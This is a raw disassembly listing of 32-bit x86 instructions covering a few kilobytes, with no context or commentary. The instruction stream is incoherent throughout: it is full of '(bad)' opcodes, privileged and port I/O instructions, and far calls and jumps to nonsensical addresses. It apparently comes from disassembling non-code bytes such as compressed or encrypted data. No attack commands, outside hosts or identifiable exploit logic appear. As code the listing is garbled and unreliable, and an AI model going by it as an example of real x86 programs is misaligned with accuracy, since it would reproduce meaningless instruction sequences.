  41f302:	add    dh,BYTE PTR [edi+0x3682d9bc]
  41f308:	sub    dh,BYTE PTR [esi+ecx*4-0xa]
  41f30c:	pop    ebp
  41f30d:	hlt    
  41f30e:	mov    dh,0x97
  41f310:	jmp    0x41f2a9
  41f312:	outs   dx,BYTE PTR ds:[esi]
  41f313:	inc    edi
  41f314:	or     BYTE PTR [ebx-0x61],ch
  41f317:	or     edi,0x53
  41f31a:	jae    0x41f373
  41f31c:	shl    BYTE PTR [esi],0x3b
  41f31f:	pop    esp
  41f320:	clc    
  41f321:	dec    ebx
  41f322:	sbb    al,BYTE PTR [eax+0xc]
  41f325:	add    DWORD PTR [edx+0x1f],edx
  41f328:	clc    
  41f329:	rcl    esi,0x9c
  41f32c:	push   esp
  41f32d:	cdq    
  41f32e:	aam    0x7
  41f330:	lods   eax,DWORD PTR ds:[esi]
  41f331:	loope  0x41f31d
  41f333:	mov    ebp,0xeacb67af
  41f338:	mov    DWORD PTR [eax],ebp
  41f33a:	out    dx,al
  41f33b:	scas   eax,DWORD PTR es:[edi]
  41f33c:	aaa    
  41f33d:	and    dh,bh
  41f33f:	dec    ebp
  41f340:	les    ebp,FWORD PTR [edx]
  41f342:	call   0xe0a3:0x84fd7807
  41f349:	mov    bl,0xe3
  41f34b:	xchg   DWORD PTR [edi-0x1f],esi
  41f34e:	stos   DWORD PTR es:[edi],eax
  41f34f:	sti    
  41f350:	xor    DWORD PTR [edx-0x7a651b5f],eax
  41f356:	fmul   st,st(5)
  41f358:	and    esp,edi
  41f35a:	mov    esp,esp
  41f35c:	loopne 0x41f338
  41f35e:	dec    esi
  41f35f:	lock inc ebp
  41f361:	sub    BYTE PTR [edx+0x657c787],ch
  41f367:	(bad)  
  41f368:	outs   dx,DWORD PTR ds:[esi]
  41f369:	pop    edi
  41f36a:	xlat   BYTE PTR ds:[ebx]
  41f36b:	lock mov ch,0x4c
  41f36e:	sbb    eax,0xc89223ee
  41f373:	and    al,0x78
  41f375:	push   ds
  41f376:	or     DWORD PTR [ecx-0x5e86527f],0xffffffcf
  41f37d:	adc    DWORD PTR [ebp+0x73],ebp
  41f380:	fnstsw WORD PTR [edx+0x5b]
  41f383:	xor    BYTE PTR [edi+0x7c],0x65
  41f387:	daa    
  41f388:	add    BYTE PTR ds:0xa73c8be2,dl
  41f38e:	ins    DWORD PTR es:[edi],dx
  41f38f:	sbb    DWORD PTR [eax-0x72],edi
  41f392:	mov    ds:0xd63118f,al
  41f397:	push   esi
  41f398:	pop    eax
  41f399:	push   ss
  41f39a:	inc    edx
  41f39b:	xchg   ebp,eax
  41f39c:	xchg   ebp,eax
  41f39d:	pop    esi
  41f39e:	or     cl,BYTE PTR [esi+ecx*2+0x44]
  41f3a2:	jae    0x41f3e0
  41f3a4:	(bad)  
  41f3a6:	(bad)  
  41f3a7:	fistp  QWORD PTR ds:0xd320d122
  41f3ad:	rol    BYTE PTR [edi],cl
  41f3af:	das    
  41f3b0:	add    al,0xe6
  41f3b2:	test   BYTE PTR [ebp+0x70],bl
  41f3b5:	cli    
  41f3b6:	push   ss
  41f3b7:	xchg   BYTE PTR [edx+0x40eb9f4a],dh
  41f3bd:	ins    DWORD PTR es:[edi],dx
  41f3be:	outs   dx,BYTE PTR ds:[esi]
  41f3bf:	or     dh,BYTE PTR [ebx+0x4c67a8cf]
  41f3c5:	sbb    DWORD PTR [esi+0x76],0x30e4d17a
  41f3cc:	jmp    0x2904f64c
  41f3d1:	pop    ebx
  41f3d2:	jge    0x41f3f3
  41f3d4:	ret    0xdd73
  41f3d7:	outs   dx,DWORD PTR ds:[si]
  41f3d9:	push   ecx
  41f3da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3db:	xor    cl,BYTE PTR [edi]
  41f3dd:	sbb    edx,DWORD PTR [ebx]
  41f3df:	inc    ecx
  41f3e0:	adc    BYTE PTR [eax],dl
  41f3e2:	leave  
  41f3e3:	adc    esp,DWORD PTR [ecx+0x4d7b06f6]
  41f3e9:	push   0x73
  41f3eb:	xchg   esp,eax
  41f3ec:	dec    ebp
  41f3ed:	cmc    
  41f3ee:	in     al,dx
  41f3ef:	dec    ebp
  41f3f0:	(bad)  
  41f3f1:	(bad)  [eax+edi*2]
  41f3f4:	inc    edx
  41f3f5:	imul   ebx,edx,0x9b97db3b
  41f3fb:	mov    DWORD PTR [esi-0x562bee0d],ebp
  41f401:	mov    edi,0x67836296
  41f406:	cmp    DWORD PTR [ebp-0x3],edi
  41f409:	sub    BYTE PTR [ecx+0x33],dh
  41f40c:	int3   
  41f40d:	mov    dh,0x6f
  41f40f:	loop   0x41f3db
  41f411:	jmp    FWORD PTR [ebp+0x33be4aba]
  41f417:	retf   0x52c3
  41f41a:	inc    ebp
  41f41b:	dec    ebp
  41f41c:	jnp    0x41f41d
  41f41e:	retf   
  41f41f:	int3   
  41f420:	xchg   esi,eax
  41f421:	mov    dh,0xfa
  41f423:	inc    esi
  41f424:	xchg   ecx,eax
  41f425:	stos   BYTE PTR es:[edi],al
  41f426:	lock (bad) 
  41f428:	(bad)  
  41f429:	loop   0x41f430
  41f42b:	push   ebx
  41f42c:	xor    DWORD PTR [ecx-0xc],ebx
  41f42f:	xor    BYTE PTR [esp+edi*1],dl
  41f432:	pusha  
  41f433:	push   edi
  41f434:	nop
  41f435:	rcr    esi,1
  41f437:	aad    0x33
  41f439:	scas   eax,DWORD PTR es:[edi]
  41f43a:	imul   eax,DWORD PTR [esi],0x9d04869a
  41f440:	pop    ss
  41f441:	cs fs iret 
  41f444:	lods   eax,DWORD PTR ds:[esi]
  41f445:	sti    
  41f446:	test   BYTE PTR [ebp-0x48af0420],ah
  41f44c:	xchg   ebp,eax
  41f44d:	es sbb esi,edx
  41f450:	popf   
  41f451:	xor    DWORD PTR [edx+0x62763621],edx
  41f457:	add    edi,esi
  41f459:	repz imul ebp,DWORD PTR [ebp+0x65],0xd57a16ac
  41f461:	inc    edx
  41f462:	mov    ds:0x762d75a8,al
  41f467:	add    BYTE PTR [edi+0x1],dh
  41f46a:	xchg   esi,eax
  41f46b:	xor    eax,0x1a82c61a
  41f470:	gs pusha 
  41f472:	lahf   
  41f473:	inc    esp
  41f474:	test   eax,0x82b67a84
  41f479:	mov    ecx,0xe709fff0
  41f47e:	dec    ebp
  41f47f:	popf   
  41f480:	outs   dx,BYTE PTR ds:[esi]
  41f481:	and    al,0x37
  41f483:	pop    ebp
  41f484:	fist   DWORD PTR [ecx+0x6a]
  41f487:	fild   DWORD PTR [edi]
  41f489:	out    dx,eax
  41f48a:	pop    es
  41f48b:	mov    dl,0xf5
  41f48d:	pop    ss
  41f48e:	mov    bh,0x70
  41f490:	or     BYTE PTR [edi+0x558fc87b],bl
  41f496:	push   edi
  41f497:	mov    edi,0x1ebdc42b
  41f49c:	repz push ds
  41f49e:	jb     0x41f4d8
  41f4a0:	dec    ecx
  41f4a1:	sub    bh,bl
  41f4a3:	arpl   si,bp
  41f4a5:	add    eax,0x678c38e3
  41f4aa:	add    BYTE PTR [ebx],0x4
  41f4ad:	jno    0x41f525
  41f4af:	scas   al,BYTE PTR es:[edi]
  41f4b0:	call   0x88b44f29
  41f4b5:	ret    0x5b2f
  41f4b8:	or     cl,dh
  41f4ba:	xchg   ecx,eax
  41f4bb:	jp     0x41f4cc
  41f4bd:	push   es
  41f4be:	xchg   bl,al
  41f4c0:	sub    DWORD PTR cs:[ebp+esi*1-0x19],edx
  41f4c5:	fcomip st,st(6)
  41f4c7:	mov    ah,0xa3
  41f4c9:	mov    esi,0x6a5bb422
  41f4ce:	in     al,dx
  41f4cf:	scas   al,BYTE PTR es:[edi]
  41f4d0:	cmp    DWORD PTR [esi],ebp
  41f4d2:	cli    
  41f4d3:	pop    esi
  41f4d4:	or     edx,DWORD PTR [esi-0x25eb7702]
  41f4da:	cdq    
  41f4db:	and    DWORD PTR [ebp+0x0],edi
  41f4de:	xchg   esp,eax
  41f4df:	lods   al,BYTE PTR ds:[esi]
  41f4e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4e1:	sbb    dh,BYTE PTR [edi+eax*1-0xb8c0718]
  41f4e8:	aaa    
  41f4e9:	fwait
  41f4ea:	test   BYTE PTR [eax],ch
  41f4ec:	mov    bh,0x63
  41f4ee:	pop    esi
  41f4ef:	xchg   DWORD PTR [edx+ebp*8+0x28],edx
  41f4f3:	ss sti 
  41f4f5:	fbstp  TBYTE PTR [ebx+0x750a3ef0]
  41f4fb:	rol    edi,1
  41f4fd:	dec    esi
  41f4fe:	xchg   ebx,eax
  41f4ff:	sbb    al,0xec
  41f501:	not    DWORD PTR [ebx-0x17b634dd]
  41f507:	add    al,0xd8
  41f509:	xchg   ebp,eax
  41f50a:	mov    eax,ds:0xeffa9a2b
  41f50f:	dec    esp
  41f510:	(bad)  
  41f511:	call   0xa804bbc6
  41f516:	lea    ax,[ebx+ecx*2-0x75]
  41f51b:	push   eax
  41f51c:	rcr    DWORD PTR [edi-0x4b],1
  41f51f:	repz into 
  41f521:	fs push edi
  41f523:	lgdtd  ds:0x69672dfb
  41f52a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f52b:	mov    ds:0x20dfd79f,eax
  41f530:	and    DWORD PTR [edi],esi
  41f532:	lahf   
  41f533:	out    0xfb,eax
  41f535:	test   al,0x58
  41f537:	mov    al,ds:0x9b9619d6
  41f53c:	add    BYTE PTR [ecx+eax*1-0x35dd206a],bl
  41f543:	xchg   ebp,eax
  41f544:	push   esp
  41f545:	mov    ds:0xbca414e2,al
  41f54a:	dec    esi
  41f54b:	rol    BYTE PTR [ebx],1
  41f54d:	cwde   
  41f54e:	test   eax,0x7f87e0ad
  41f553:	and    DWORD PTR [ebx-0x38],edi
  41f556:	call   FWORD PTR ds:0x5f92c42b
  41f55d:	mov    bh,0x58
  41f55f:	adc    eax,0x6ada7b58
  41f564:	xchg   ebx,eax
  41f565:	push   cs
  41f566:	sbb    BYTE PTR [esi+0x5a],0x84
  41f56a:	ffree  st(5)
  41f56c:	push   0xffffffcb
  41f56e:	mov    ebp,0x6ed6091d
  41f573:	ins    DWORD PTR es:[edi],dx
  41f574:	data16 fwait
  41f576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f577:	inc    edx
  41f578:	cdq    
  41f579:	cmp    eax,DWORD PTR [eax+0x23b352a4]
  41f57f:	jmp    0x4f01281b
  41f584:	stc    
  41f585:	or     DWORD PTR [edx],esi
  41f587:	arpl   dx,ax
  41f589:	sub    BYTE PTR [ecx-0x5b],dh
  41f58c:	and    esi,DWORD PTR [ebp+0x3d]
  41f58f:	push   eax
  41f590:	in     al,dx
  41f591:	mov    al,BYTE PTR [eax+ebx*4]
  41f594:	fwait
  41f595:	dec    DWORD PTR [edi]
  41f597:	addr16 cdq 
  41f599:	cmp    eax,0xf2713257
  41f59e:	std    
  41f59f:	and    eax,0x7fb0b8ca
  41f5a4:	push   edi
  41f5a5:	dec    ebx
  41f5a6:	cdq    
  41f5a7:	out    dx,eax
  41f5a8:	outs   dx,BYTE PTR ds:[esi]
  41f5a9:	jno    0x41f616
  41f5ab:	pop    esp
  41f5ac:	dec    edi
  41f5ad:	inc    BYTE PTR [ebx+0x22890206]
  41f5b3:	gs inc esi
  41f5b5:	push   cs
  41f5b6:	mov    ds:0xb4199b8b,al
  41f5bb:	or     eax,esp
  41f5bd:	lods   eax,DWORD PTR ds:[esi]
  41f5be:	adc    esp,DWORD PTR [edx]
  41f5c0:	mov    ah,0x2d
  41f5c2:	mov    al,0x5f
  41f5c4:	lds    esi,FWORD PTR [ecx-0x39ac7793]
  41f5ca:	jb     0x41f593
  41f5cc:	push   esp
  41f5cd:	or     eax,0x509b0e6e
  41f5d2:	mov    eax,gs
  41f5d4:	add    esp,DWORD PTR [esi+edx*8]
  41f5d7:	lahf   
  41f5d8:	ja     0x41f5d4
  41f5da:	call   0x6f52d9b8
  41f5df:	fisubr DWORD PTR [ecx-0x4dae186]
  41f5e5:	mov    al,0xfd
  41f5e7:	mov    ebx,0x1d291506
  41f5ec:	inc    esp
  41f5ed:	test   DWORD PTR [edx+0x1c],ebx
  41f5f0:	or     ebx,DWORD PTR [ecx]
  41f5f2:	ins    BYTE PTR es:[edi],dx
  41f5f3:	loope  0x41f5a7
  41f5f5:	inc    ebp
  41f5f6:	or     dh,ch
  41f5f8:	pop    esi
  41f5f9:	add    esp,DWORD PTR [ecx-0x41518dde]
  41f5ff:	add    ecx,DWORD PTR [esp+esi*8-0x2d575691]
  41f606:	es clc 
  41f608:	(bad)  
  41f609:	pop    eax
  41f60a:	popf   
  41f60b:	outs   dx,BYTE PTR ds:[esi]
  41f60c:	sub    BYTE PTR [edx+0x69],ch
  41f60f:	fidivr DWORD PTR [edx+0x3f5ddd16]
  41f615:	inc    ebx
  41f616:	inc    ebx
  41f617:	test   al,0x90
  41f619:	loope  0x41f675
  41f61b:	jbe    0x41f5b2
  41f61d:	pop    ebx
  41f61e:	xor    eax,0x7b913982
  41f623:	ret    
  41f624:	jno    0x41f696
  41f626:	stc    
  41f627:	clc    
  41f628:	sbb    eax,0x90e7d64a
  41f62d:	pop    ds
  41f62e:	int3   
  41f62f:	jns    0x41f622
  41f631:	cdq    
  41f632:	inc    edi
  41f633:	adc    DWORD PTR [eax],ecx
  41f635:	jne    0x41f6ac
  41f637:	jns    0x41f669
  41f639:	pop    ecx
  41f63a:	adc    al,0x82
  41f63c:	fdivr  st(4),st
  41f63e:	add    DWORD PTR [esi],eax
  41f640:	pop    eax
  41f641:	hlt    
  41f642:	mov    ds,WORD PTR ds:0x4171ebcc
  41f648:	ss aad 0x64
  41f64b:	arpl   WORD PTR [ecx],ax
  41f64d:	add    dl,BYTE PTR [edi-0x346733ea]
  41f653:	mov    BYTE PTR [ecx-0x21],bh
  41f656:	pop    ds
  41f657:	lods   eax,DWORD PTR ds:[esi]
  41f658:	mov    cl,0xb5
  41f65a:	jnp    0x41f680
  41f65c:	adc    BYTE PTR [edi+0x1f],dl
  41f65f:	xchg   ebp,eax
  41f660:	sub    BYTE PTR [edi+0x3c],ah
  41f663:	lods   al,BYTE PTR ds:[esi]
  41f664:	cmp    DWORD PTR [edx-0x45],edi
  41f667:	xchg   esi,eax
  41f668:	gs fsqrt 
  41f66b:	xchg   edx,eax
  41f66c:	inc    edx
  41f66d:	out    dx,al
  41f66e:	mov    edi,0xe80e518d
  41f673:	cmp    DWORD PTR ds:0x31785e2c,edi
  41f679:	push   ebp
  41f67a:	xchg   edi,eax
  41f67b:	adc    dh,BYTE PTR [edi+edx*8]
  41f67e:	pop    ecx
  41f67f:	fs cs stc 
  41f682:	pop    ss
  41f683:	mov    eax,0x2e2fe16b
  41f688:	in     eax,dx
  41f689:	mov    ebp,DWORD PTR [edx-0x56564759]
  41f68f:	and    DWORD PTR [ebp-0xcfb93a],esp
  41f695:	cmp    dh,cl
  41f697:	outs   dx,BYTE PTR ds:[esi]
  41f698:	clc    
  41f699:	aas    
  41f69a:	(bad)  
  41f69b:	fld    QWORD PTR [edx]
  41f69d:	ss mov ch,0x6e
  41f6a0:	(bad)  
  41f6a2:	jbe    0x41f658
  41f6a4:	mov    ebp,DWORD PTR [ecx+ecx*2]
  41f6a7:	push   esp
  41f6a8:	pop    edi
  41f6a9:	cmp    BYTE PTR [esi+0x7a],dh
  41f6ac:	fld1   
  41f6ae:	nop
  41f6af:	(bad)  
  41f6b1:	dec    edx
  41f6b2:	cmc    
  41f6b3:	dec    al
  41f6b5:	mov    edi,0x59382cbe
  41f6ba:	sbb    dh,BYTE PTR [edx+ebx*2]
  41f6bd:	sub    ecx,DWORD PTR [esi]
  41f6bf:	rcr    DWORD PTR [esi],cl
  41f6c1:	cli    
  41f6c2:	mov    ebx,0xb213a003
  41f6c7:	or     DWORD PTR [esi+ecx*1],eax
  41f6ca:	addr16 xchg edi,edi
  41f6cd:	mov    esi,0x1d44e3bb
  41f6d2:	mov    al,ds:0x926b59a1
  41f6d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6d8:	bound  esi,QWORD PTR [edi+0x3a390ae4]
  41f6de:	pusha  
  41f6df:	nop
  41f6e0:	mov    edx,0x36c34d8d
  41f6e5:	ss fwait
  41f6e7:	jl     0x41f6b0
  41f6e9:	mov    dl,0x45
  41f6eb:	add    al,0x75
  41f6ed:	push   esp
  41f6ee:	xchg   al,al
  41f6f0:	pop    ss
  41f6f1:	push   ss
  41f6f2:	sar    esp,0xd6
  41f6f5:	imul   ebp,DWORD PTR [eax-0x601a3262],0xffffffb1
  41f6fc:	test   BYTE PTR [ebx-0x44b3cc66],cl
  41f702:	scas   eax,DWORD PTR es:[edi]
  41f703:	and    BYTE PTR [ebp+0x762d17f7],bl
  41f709:	mov    al,0x2b
  41f70b:	cdq    
  41f70c:	mov    ecx,0x791b3d65
  41f711:	xor    al,0xb3
  41f713:	mov    bl,0xfd
  41f715:	cmp    cl,ch
  41f717:	aam    0x72
  41f719:	pop    es
  41f71a:	je     0x41f6e9
  41f71c:	pop    esi
  41f71e:	pop    eax
  41f71f:	cmp    eax,0xc88a361d
  41f724:	xor    eax,0x554e538f
  41f729:	inc    eax
  41f72a:	mov    bh,0xca
  41f72c:	fwait
  41f72d:	ret    0xcf4e
  41f730:	in     eax,0xf
  41f732:	rcr    BYTE PTR [ecx+0x36],cl
  41f735:	adc    bh,BYTE PTR [edi-0x5a4af4e4]
  41f73b:	sub    BYTE PTR [ecx+edi*2],dl
  41f73e:	xchg   esp,eax
  41f73f:	popf   
  41f740:	stc    
  41f741:	push   ss
  41f742:	xchg   esi,eax
  41f743:	mov    esi,DWORD PTR [ecx+0x77]
  41f746:	push   edx
  41f747:	jns    0x41f7b9
  41f749:	(bad)  
  41f74a:	dec    edx
  41f74b:	jmp    0x5528be18
  41f750:	and    DWORD PTR [ebx-0x1b],ebx
  41f753:	mov    ah,0x76
  41f755:	cmp    ch,BYTE PTR [edx-0x4]
  41f758:	or     edx,edi
  41f75a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f75b:	mov    ebx,0x826d9b80
  41f760:	pop    ebp
  41f761:	xor    BYTE PTR [edi-0x1aff76b7],0x51
  41f768:	icebp  
  41f769:	fnstcw WORD PTR [edx-0x75]
  41f76c:	shl    DWORD PTR [eax+0x281871ed],cl
  41f772:	cmp    dh,BYTE PTR [edx+0x11888afc]
  41f778:	mov    dh,0x5d
  41f77a:	std    
  41f77b:	loopne 0x41f764
  41f77d:	nop
  41f77e:	test   eax,0xe2e36d15
  41f783:	sub    BYTE PTR ds:0x7e8c50c2,dh
  41f789:	mov    ch,0xdf
  41f78b:	inc    ebp
  41f78c:	adc    bl,BYTE PTR [edi]
  41f78e:	jl     0x41f749
  41f790:	fiadd  WORD PTR [ecx+0x1a427cb3]
  41f796:	lods   al,BYTE PTR ds:[esi]
  41f797:	add    ch,ah
  41f799:	mov    ch,0x79
  41f79b:	jl     0x41f798
  41f79d:	or     al,0x29
  41f79f:	(bad)  
  41f7a0:	fmul   QWORD PTR [ecx+eax*8+0x702a734e]
  41f7a7:	pop    esi
  41f7a8:	(bad)
  41f7ac:	cld    
  41f7ad:	add    BYTE PTR [edx-0x3a],bh
  41f7b0:	push   edi
  41f7b1:	mov    eax,ds:0x219c8e93
  41f7b6:	add    DWORD PTR ds:[eax+0x54226c4d],edx
  41f7bd:	add    al,0x38
  41f7bf:	pushf  
  41f7c0:	mov    ebx,0xc8a15971
  41f7c5:	test   ebx,edx
  41f7c7:	push   edx
  41f7c8:	fwait
  41f7c9:	ret    0x8d9
  41f7cc:	inc    ecx
  41f7cd:	mov    bl,ch
  41f7cf:	mov    ecx,0x9a2db67
  41f7d4:	(bad)  
  41f7d5:	cli    
  41f7d6:	fidivr WORD PTR [esi-0x6c790932]
  41f7dc:	js     0x41f77e
  41f7de:	daa    
  41f7df:	mov    edi,DWORD PTR [esp+ecx*1-0x13a22e8e]
  41f7e6:	ror    BYTE PTR [eax+0x4e28d444],cl
  41f7ec:	xor    edi,DWORD PTR [ebp-0x66]
  41f7ef:	shl    DWORD PTR [edi+0xb],cl
  41f7f2:	sub    eax,0x518c787c
  41f7f7:	inc    ecx
  41f7f8:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41f7fa:	jg     0x41f86e
  41f7fc:	loop   0x41f82d
  41f7fe:	adc    ebx,DWORD PTR [esi+0x2c23b124]
  41f804:	hlt    
  41f805:	sbb    BYTE PTR [esi+0x75],al
  41f808:	stc    
  41f809:	(bad)  
  41f80a:	test   DWORD PTR [esi+0x36],0x19149713
  41f811:	gs cmc 
  41f813:	icebp  
  41f814:	pop    ebp
  41f815:	ret    0x6750
  41f818:	das    
  41f819:	(bad)  
  41f81a:	loop   0x41f84a
  41f81c:	icebp  
  41f81d:	into   
  41f81e:	imul   eax,DWORD PTR [edx-0x26],0xffffff97
  41f822:	mov    edi,0x7574bba0
  41f827:	lods   eax,DWORD PTR ds:[esi]
  41f828:	add    bh,BYTE PTR [ecx+0x35aa8ea9]
  41f82e:	fsubr  QWORD PTR [ebp+0x65c5138a]
  41f834:	in     eax,dx
  41f835:	xor    eax,0xc6d65bc4
  41f83a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f83b:	data16 sti 
  41f83d:	test   eax,0xca2851a1
  41f842:	out    dx,eax
  41f843:	call   0x1f26:0x409a278d
  41f84a:	push   ss
  41f84b:	cmp    eax,0x26013299
  41f850:	sbb    cl,bl
  41f852:	mov    cl,0xcb
  41f854:	jbe    0x41f898
  41f856:	mov    bl,0xad
  41f858:	imul   esp,DWORD PTR [ebx],0xd7189c82
  41f85e:	dec    BYTE PTR [edx]
  41f860:	xchg   esi,eax
  41f861:	jmp    0x41f8d6
  41f863:	and    ah,BYTE PTR [esi+0x31]
  41f866:	arpl   bx,di
  41f868:	pop    edi
  41f869:	ins    DWORD PTR es:[edi],dx
  41f86a:	in     eax,0x7e
  41f86c:	ja     0x41f8aa
  41f86e:	ss test al,0xb0
  41f871:	push   edx
  41f872:	inc    ebp
  41f873:	adc    al,0xe
  41f875:	sub    ch,dh
  41f877:	lods   eax,DWORD PTR ds:[esi]
  41f878:	das    
  41f879:	pop    ss
  41f87a:	push   eax
  41f87b:	sar    DWORD PTR [edi-0x80],cl
  41f87e:	imul   esp,DWORD PTR [esi-0x29],0xffffffd5
  41f882:	pop    ss
  41f883:	aam    0xca
  41f885:	mov    al,ds:0xb22dd341
  41f88a:	js     0x41f8c3
  41f88c:	adc    bl,BYTE PTR [edi+edi*8+0x6b]
  41f890:	stos   BYTE PTR es:[edi],al
  41f891:	addr16 sbb esi,eax
  41f894:	dec    ebp
  41f895:	leave  
  41f896:	mov    ecx,0xec73552d
  41f89b:	cli    
  41f89c:	and    al,0x65
  41f89e:	call   0xc099:0xcb24a22d
  41f8a5:	mov    db5,ebx
  41f8a8:	xor    al,0x82
  41f8aa:	or     edi,DWORD PTR [eax+edi*4]
  41f8ad:	sbb    eax,0x4b4262f4
  41f8b2:	repnz imul esi,ecx,0x4103f8a6
  41f8b9:	mov    eax,ds:0xa835fc0f
  41f8be:	in     eax,0xaa
  41f8c0:	test   ebp,0xff36a30a
  41f8c6:	push   cs
  41f8c7:	lock dec esp
  41f8c9:	add    BYTE PTR ds:0x8553ee64,dl
  41f8cf:	push   ss
  41f8d0:	and    DWORD PTR [eax-0x66050c26],ecx
  41f8d6:	pop    ebp
  41f8d7:	pop    esp
  41f8d8:	push   edx
  41f8d9:	sub    edi,DWORD PTR [esi-0x5c]
  41f8dc:	sbb    cl,BYTE PTR [ecx-0x50]
  41f8df:	jmp    0x170bd145
  41f8e4:	dec    esp
  41f8e5:	int    0x4d
  41f8e7:	call   0x5dafe0a0
  41f8ec:	adc    ecx,ebp
  41f8ee:	repz xor eax,0xef5ac0e2
  41f8f4:	add    dh,BYTE PTR [eax-0x3f217bf9]
  41f8fa:	addr16 pop ebp
  41f8fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8fd:	imul   BYTE PTR [esi+0x7db6c92a]
  41f903:	scas   al,BYTE PTR es:[edi]
  41f904:	pusha  
  41f905:	retf   
  41f906:	push   ebx
  41f907:	pusha  
  41f908:	or     eax,0x60a4c777
  41f90d:	mov    cl,0x7e
  41f90f:	cdq    
  41f910:	or     ecx,DWORD PTR [edx]
  41f912:	rcl    BYTE PTR [ebx-0x6f],1
  41f915:	je     0x41f903
  41f917:	mov    ds:0xb1cd9c7e,al
  41f91c:	(bad)  
  41f91d:	js     0x41f917
  41f91f:	mov    dh,0x6b
  41f921:	sbb    dh,ch
  41f923:	adc    edi,edx
  41f925:	retf   
  41f926:	mov    gs,WORD PTR [ebx]
  41f928:	mov    ch,0x6
  41f92a:	imul   DWORD PTR [esi+0xf0f4fd3]
  41f930:	call   0xfd8a:0x9ee7835e
  41f937:	icebp  
  41f938:	adc    ah,BYTE PTR [ebx-0x59eb3056]
  41f93e:	xor    BYTE PTR [edx+0x47],bh
  41f941:	mov    WORD PTR [eax-0x65],cs
  41f944:	mov    dh,0x62
  41f946:	cmc    
  41f947:	rcl    BYTE PTR [edi],1
  41f949:	je     0x41f94e
  41f94b:	outs   dx,BYTE PTR ds:[esi]
  41f94c:	dec    eax
  41f94d:	mov    edx,0x5da14fd3
  41f953:	dec    ebx
  41f954:	sub    cl,BYTE PTR [eax]
  41f956:	idiv   al
  41f958:	cmp    BYTE PTR [esi],bh
  41f95a:	pop    esp
  41f95b:	push   ecx
  41f95c:	mov    fs,WORD PTR [edx-0x33694d7b]
  41f962:	mov    cl,0xa7
  41f964:	adc    ebp,DWORD PTR [ebx-0x24]
  41f967:	mov    ecx,DWORD PTR [edi+eax*4+0x18]
  41f96b:	popa   
  41f96c:	xchg   ecx,eax
  41f96d:	sbb    eax,0xef8ea77b
  41f972:	(bad)  
  41f973:	mov    dh,0xd1
  41f975:	sbb    eax,0x358c4ede
  41f97a:	pop    ds
  41f97b:	push   ds
  41f97c:	enter  0xd0cb,0x8d
  41f980:	enter  0xa04b,0xe9
  41f984:	outs   dx,BYTE PTR ds:[esi]
  41f985:	neg    DWORD PTR [esi-0x6d6f78e9]
  41f98b:	cdq    
  41f98c:	lahf   
  41f98d:	retf   0x7a6a
  41f990:	push   ebp
  41f991:	pushf  
  41f992:	call   0x5d1:0x6bd81b6a
  41f999:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41f99b:	mov    edi,?
  41f99d:	xor    DWORD PTR [edi],edi
  41f99f:	push   0x2061c39b
  41f9a4:	call   0xd524:0x2633413c
  41f9ab:	ror    dh,1
  41f9ad:	ds pop ebx
  41f9af:	(bad)  [edi]
  41f9b1:	stos   BYTE PTR es:[edi],al
  41f9b2:	mov    dl,0x75
  41f9b4:	or     DWORD PTR [edi-0x158aae7f],0x286c48e3
  41f9be:	mov    ch,0x7
  41f9c0:	bound  ebp,QWORD PTR [eax+0x7d]
  41f9c3:	ins    BYTE PTR es:[edi],dx
  41f9c4:	cdq    
  41f9c5:	jns    0x41f9af
  41f9c7:	fnstsw WORD PTR ds:0xbb7664de
  41f9cd:	popf   
  41f9ce:	inc    eax
  41f9cf:	sub    cl,BYTE PTR [ebp-0x18]
  41f9d2:	jg     0x41f9da
  41f9d4:	mov    esi,0x170bacc3
  41f9d9:	fwait
  41f9da:	out    dx,al
  41f9db:	fisubr WORD PTR [esi+edx*1-0x22]
  41f9df:	xor    ch,BYTE PTR [ebp+0x2bb24240]
  41f9e5:	repnz out 0x1d,eax
  41f9e8:	xor    ah,bl
  41f9ea:	stos   DWORD PTR es:[edi],eax
  41f9eb:	xchg   esi,eax
  41f9ec:	adc    esi,ebx
  41f9ee:	ins    BYTE PTR es:[edi],dx
  41f9ef:	xor    bl,BYTE PTR [ebx]
  41f9f1:	sub    eax,0x174005fd
  41f9f6:	jmp    0x6d2:0xb43f73bd
  41f9fd:	std    
  41f9fe:	mov    ds:0x6a855ad,eax
  41fa03:	mov    esp,0x85cdd3fe
  41fa08:	inc    ebx
  41fa09:	sahf   
  41fa0a:	or     eax,0xd37b66e1
  41fa0f:	adc    DWORD PTR [edx-0x3],esp
  41fa12:	inc    esi
  41fa13:	xor    al,0xfb
  41fa15:	retf   0xf19c
  41fa18:	inc    ecx
  41fa19:	(bad)  
  41fa1a:	jl     0x41fa23
  41fa1c:	lods   al,BYTE PTR ds:[esi]
  41fa1d:	jo     0x41fa09
  41fa1f:	push   0xaed46c88
  41fa24:	or     eax,0x14d7d33c
  41fa29:	mov    ecx,0xa76684a0
  41fa2e:	out    0x8d,al
  41fa30:	inc    ecx
  41fa31:	pop    esi
  41fa32:	push   ebx
  41fa33:	popa   
  41fa34:	bound  edx,QWORD PTR [ebp+0x19]
  41fa37:	or     eax,0xe0d32cbe
  41fa3c:	pop    edi
  41fa3d:	sub    ebx,DWORD PTR [ebx]
  41fa3f:	pop    es
  41fa40:	repz inc ebx
  41fa42:	shr    BYTE PTR [ebx],1
  41fa44:	inc    esi
  41fa45:	cmp    DWORD PTR [ebx],esp
  41fa47:	scas   al,BYTE PTR es:[edi]
  41fa48:	lods   eax,DWORD PTR ds:[esi]
  41fa49:	jns    0x41fa63
  41fa4b:	cmp    BYTE PTR [esi-0x70],ch
  41fa4e:	adc    edx,DWORD PTR [ebx]
  41fa50:	mov    al,0x19
  41fa52:	ds test eax,0x90c9e7af
  41fa58:	inc    esp
  41fa59:	push   edi
  41fa5a:	sub    DWORD PTR [eax-0x5d],ebx
  41fa5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa5e:	lock sbb eax,0x5c8104bc
  41fa64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
